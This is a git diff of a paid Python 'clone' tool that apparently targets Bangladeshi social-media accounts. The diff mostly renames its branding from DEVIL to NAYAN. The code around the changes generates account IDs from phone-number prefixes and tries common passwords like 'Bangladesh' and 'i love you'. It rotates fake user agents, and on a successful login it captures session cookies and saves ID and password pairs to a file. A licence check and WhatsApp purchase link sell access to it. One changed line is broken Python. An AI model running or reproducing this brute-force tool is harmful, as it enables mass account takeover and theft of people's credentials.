@@ -73,7 +73,7 @@ try:
 except ValueError:
     exit()
 def banner():
-    print("Testing New mathod By DEVIL")
+    print("Testing New mathod By NAYAN")
 current = datetime.now()
 ta = current.year
 bu = current.month
@@ -115,7 +115,7 @@ rr = random.randint
 for xd in range(3005):
     ff=(f'Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}')
     uas.append(ff)
-for DEVIL in range(9993,176281):
+for NAYAN in range(9993,176281):
     aa='Mozilla/5.0 (Linux; Android'
     b=random.choice(['6','7','8','9','10','11','12'])
     c='TRT-L53 Build/HUAWEITRT-L53; wv)'
@@ -138,7 +138,7 @@ def jalan(z):
 def menu_apikey():
   uuid = str(os.geteuid()) + str(os.getlogin())
   id = "∞".join(uuid)
-  server = requests.get('https://raw.githubusercontent.com/DEVIL00/game.py/main/game.txt').text
+  server = requests.get('https://raw.githubusercontent.com/NAYAN00/game.py/main/game.txt').text
   
 
 logo=("""\033[1;32m
@@ -168,7 +168,7 @@ def chk():
   try: 
     httpCaht = requests.get("https://github.com/MR-NAYAN-404/approval/blob/main/approval.txt").text 
     if id in httpCaht: 
-      print("\033[92m  YOUR KEY IS ACTIVE😘........\033[97m")
+      print("\033[92m YOUR KEY IS ACTIVE😘........\033[97m")
       msg = str(os.geteuid()) 
       time.sleep(3) 
       pass 
@@ -176,10 +176,10 @@ def chk():
       print("\033[0;31mYOUR key IS NOT ACTIVE💔") 
       print("\033[0;31mThis Tool Is Paid")
       print("\033[1;32m 3days  150 tk\n 7days  300 tk\n 15days 500 tk")
-      nm=input("\033[0;32mYour Name: ")
-      print("\033[0;32mHow many days do you want to take it for?")
+      nm=input("\033[1;32mYour Name: ")
+      print("\033[1;32mHow many days do you want to take it for?")
       dt=input("DAYS: ")
-      print('\033[0;32mYour Request Submitted Please Wait')
+      print('\033[1;32mYour Request Submitted Please Wait')
       os.system('xdg-open  https://wa.me/+8801615298449?text=*Hello*%2C%20*Mr.Nayan*%20*i*%20*want*%20*to*%20*buy*%20*your*%20*command*%20*My*%20*Information*I%20*want*%20*For*%20'+dt+'*Days*%20*Name*%20'+nm+'*Key*%20*'+id)
       time.sleep(3) 
       sys.exit() 
@@ -252,13 +252,14 @@ def virus():
 		os.system('clear')
 		print(logo)
 		tl = str(len(user))
-		print(f"\033[92m[\033[37m*\033[92m] \033[37m \033[1;32m Devil Premium Mood Activated ")
-		print(f"\033[92m[\033[37m*\033[92m] \033[37m  Tool Name:\033[1;92m {doamin}")
+		print(f"\033[92m[\033[37m*\033[92m] \033[37m \033[1;32m NAYAN Premium Mood Activated ")
+		print(f"\033[92m[\033[37m*\033[92m] \033[37m  Name:"+num)
+		print(f"\033[92m[\033[37m*\033[92m] \033[37m  Tool Name:\033[1;92m {NUM CLONE}")
 		print('\033[92m[\033[37m*\033[92m] \033[37m  Total ids:\033[1;92m '+tl)
 		print(f'\033[92m[\033[37m*\033[92m] \033[37m  BD Code :\033[1;92m {kode} ')
 		print('\033[92m[\033[37m*\033[92m] \033[37m  The process has been started')
 		print('\033[92m[\033[37m*\033[92m] \033[37m \033[1;93m NOTE : Fast Airplane Mode [ On/Off ] Be For Use ')
-		print(60*'═')
+		print(60*'=')
 		for guru in user:
 			uid = kode+koda+kodb+guru
 			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','Bangladesh','i love you','i hate you','i have you','বাংলাদেশ']
@@ -276,7 +277,7 @@ def a(uid,pwx,tl):
     try:
         for ps in pwx:
             session = requests.Session()
-            sys.stdout.write(f'\r \033[1;90m[\033[1;93mDEVIL\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
+            sys.stdout.write(f'\r \033[1;90m[\033[1;93mNAYAN\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
@@ -316,15 +317,15 @@ def a(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f'\r\33[1;92m [DEVIL😦] '+cid+' | '+ps+'\33[0;92m')
+                print(f'\r\33[1;92m [NAYAN🖤] '+cid+' | '+ps+'\33[0;92m')
                 print(f'\r\033[1;92mCOOKIE  [💉]  : '+coki)
-                open('/sdcard/DEVIL-OK.txt', 'a').write(cid+' | '+ps+'\n')
+                open('/sdcard/NAYAN-OK.txt', 'a').write(cid+' | '+ps+'\n')
                 oks.append(uid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\033[m[DEVIL] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks)))
+        sys.stdout.write(f'\r\033[m[NAYAN] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks)))
         sys.stdout.flush()
     except:
         pass
